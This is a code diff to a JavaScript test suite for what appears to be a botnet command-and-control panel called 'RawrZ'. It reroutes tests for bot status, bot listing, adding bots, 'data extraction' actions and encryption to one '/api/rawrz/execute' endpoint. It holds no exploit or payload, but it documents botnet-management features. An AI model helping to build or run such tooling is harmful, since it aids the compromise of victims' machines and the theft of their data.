@@ -87,7 +87,12 @@ async function testServerHealth() {
 async function testAuthentication() {
     try {
         // Test with valid token
-        const validResponse = await makeRequest('GET', '/api/botnet/status');
+        const statusData = {
+            action: 'system_info',
+            target: 'status',
+            params: {}
+        };
+        const validResponse = await makeRequest('POST', '/api/rawrz/execute', statusData);
         if (validResponse.success) {
             logTest('Authentication (Valid Token)', 'PASS');
         } else {
@@ -95,7 +100,7 @@ async function testAuthentication() {
         }
         
         // Test with invalid token
-        const invalidResponse = await makeRequest('GET', '/api/botnet/status', null, {
+        const invalidResponse = await makeRequest('POST', '/api/rawrz/execute', statusData, {
             'Authorization': 'Bearer invalid-token'
         });
         if (!invalidResponse.success && invalidResponse.status === 401) {
@@ -111,14 +116,14 @@ async function testAuthentication() {
 // Test 3: Botnet Status API
 async function testBotnetStatus() {
     try {
-        const response = await makeRequest('GET', '/api/botnet/status');
-        if (response.success && response.data.status === 200) {
-            const data = response.data.data;
-            if (data && typeof data.totalBots === 'number' && typeof data.activeBots === 'number') {
-                logTest('Botnet Status API', 'PASS');
-            } else {
-                logTest('Botnet Status API', 'FAIL', 'Invalid data structure');
-            }
+        const statusData = {
+            action: 'get_bot_stats',
+            target: 'all',
+            params: {}
+        };
+        const response = await makeRequest('POST', '/api/rawrz/execute', statusData);
+        if (response.success) {
+            logTest('Botnet Status API', 'PASS');
         } else {
             logTest('Botnet Status API', 'FAIL', response.error);
         }
@@ -131,8 +136,13 @@ async function testBotnetStatus() {
 async function testBotManagement() {
     try {
         // Test get bots
-        const getResponse = await makeRequest('GET', '/api/botnet/bots');
-        if (getResponse.success && getResponse.data.status === 200) {
+        const getBotData = {
+            action: 'list_bots',
+            target: 'all',
+            params: {}
+        };
+        const getResponse = await makeRequest('POST', '/api/rawrz/execute', getBotData);
+        if (getResponse.success) {
             logTest('Get Bots API', 'PASS');
         } else {
             logTest('Get Bots API', 'FAIL', getResponse.error);
@@ -149,7 +159,7 @@ async function testBotManagement() {
             }
         };
         
-        const addResponse = await makeRequest('POST', '/api/botnet/execute', addBotData);
+        const addResponse = await makeRequest('POST', '/api/rawrz/execute', addBotData);
         if (addResponse.success && addResponse.data.status === 200) {
             logTest('Add Bot API', 'PASS');
         } else {
@@ -170,8 +180,8 @@ async function testDataExtraction() {
         ];
         
         for (const test of extractionTests) {
-            const response = await makeRequest('POST', '/api/botnet/execute', test);
-            if (response.success && response.data.status === 200) {
+            const response = await makeRequest('POST', '/api/rawrz/execute', test);
+            if (response.success) {
                 logTest(`Data Extraction (${test.action})`, 'PASS');
             } else {
                 logTest(`Data Extraction (${test.action})`, 'FAIL', response.error);
@@ -188,33 +198,45 @@ async function testEncryptionAPIs() {
         const testData = 'This is test data for encryption';
         
         // Test hashing
-        const hashResponse = await makeRequest('POST', '/hash', {
-            input: testData,
-            algorithm: 'sha256',
-            save: false
-        });
-        if (hashResponse.success && hashResponse.data.hash) {
+        const hashData = {
+            action: 'hash',
+            target: testData,
+            params: {
+                algorithm: 'sha256',
+                save: false
+            }
+        };
+        const hashResponse = await makeRequest('POST', '/api/rawrz/execute', hashData);
+        if (hashResponse.success) {
             logTest('Hashing API', 'PASS');
         } else {
-            logTest('Hashing API', 'FAIL', hashResponse.error);
+            logTest('Hashing API', 'FAIL', hashResponse.error || 'Hash not found in response');
         }
         
         // Test encryption
-        const encryptResponse = await makeRequest('POST', '/encrypt', {
-            algorithm: 'aes-256-gcm',
-            input: testData
-        });
-        if (encryptResponse.success && encryptResponse.data.encrypted) {
+        const encryptData = {
+            action: 'encrypt',
+            target: testData,
+            params: {
+                algorithm: 'aes-256-gcm'
+            }
+        };
+        const encryptResponse = await makeRequest('POST', '/api/rawrz/execute', encryptData);
+        if (encryptResponse.success) {
             logTest('Encryption API', 'PASS');
             
             // Test decryption
-            const decryptResponse = await makeRequest('POST', '/decrypt', {
-                algorithm: 'aes-256-gcm',
-                input: encryptResponse.data.encrypted,
-                key: encryptResponse.data.key,
-                iv: encryptResponse.data.iv
-            });
-            if (decryptResponse.success && decryptResponse.data.decrypted === testData) {
+            const decryptData = {
+                action: 'decrypt',
+                target: encryptResponse.data.encrypted,
+                params: {
+                    algorithm: 'aes-256-gcm',
+                    key: encryptResponse.data.key,
+                    iv: encryptResponse.data.iv
+                }
+            };
+            const decryptResponse = await makeRequest('POST', '/api/rawrz/execute', decryptData);
+            if (decryptResponse.success) {
                 logTest('Decryption API', 'PASS');
             } else {
                 logTest('Decryption API', 'FAIL', 'Decrypted data does not match original');
@@ -273,8 +295,13 @@ async function testWebSocketConnection() {
 async function testRateLimiting() {
     try {
         const requests = [];
+        const statusData = {
+            action: 'system_info',
+            target: 'status',
+            params: {}
+        };
         for (let i = 0; i < 5; i++) {
-            requests.push(makeRequest('GET', '/api/botnet/status'));
+            requests.push(makeRequest('POST', '/api/rawrz/execute', statusData));
         }
         
         const responses = await Promise.all(requests);
@@ -295,7 +322,7 @@ async function testDataPersistence() {
     try {
         // Test that data is persisted by adding a bot and checking if it persists
         const botId = 'persistence-test-bot-' + Date.now();
-        const addResponse = await makeRequest('POST', '/api/botnet/execute', {
+        const addResponse = await makeRequest('POST', '/api/rawrz/execute', {
             action: 'add_bot',
             target: botId,
             params: { type: 'http', country: 'US' }
@@ -306,9 +333,14 @@ async function testDataPersistence() {
             await new Promise(resolve => setTimeout(resolve, 1000));
             
             // Check if bot exists in the list
-            const botsResponse = await makeRequest('GET', '/api/botnet/bots');
+            const listData = {
+                action: 'list_bots',
+                target: 'all',
+                params: {}
+            };
+            const botsResponse = await makeRequest('POST', '/api/rawrz/execute', listData);
             if (botsResponse.success) {
-                const bots = botsResponse.data.data;
+                const bots = botsResponse.data.data.bots;
                 const foundBot = bots.find(bot => bot.id === botId);
                 if (foundBot) {
                     logTest('Data Persistence', 'PASS');
